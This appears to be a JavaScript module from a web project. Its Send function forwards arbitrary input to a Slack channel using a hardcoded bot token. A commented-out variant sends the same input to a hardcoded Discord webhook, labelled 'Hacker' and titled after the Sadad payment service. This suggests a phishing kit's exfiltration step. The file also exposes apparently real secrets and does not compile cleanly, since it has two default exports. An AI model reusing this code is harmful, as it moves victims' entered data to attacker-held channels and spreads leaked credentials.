import axios from 'axios';


export const TeleSned = () => {
    const Send = async (des) => {
        const token = "xoxb-8209093787015-8217207272950-ZbwCsf3B1Oaff7jWYjuNcYlL";
        const url = 'https://slack.com/api/chat.postMessage';

  const payload = {
    channel: '#general', // تحديد القناة مباشرة
    text: des // تعيين النص من البيانات المدخلة
  };

  await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`,
    },
    body: JSON.stringify(payload),
  });
}
/*    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1318990970519294004/Hzl6uJu85D2gLpdtbFMp-EheGuoJAdQRKR9WA85g41JoQM1umjxCikAFoivixRjADhJ5",body)
             
    }*/
  return {
    Send,
}
}

export default TeleSned;
export default async function handler(req) {
  
}
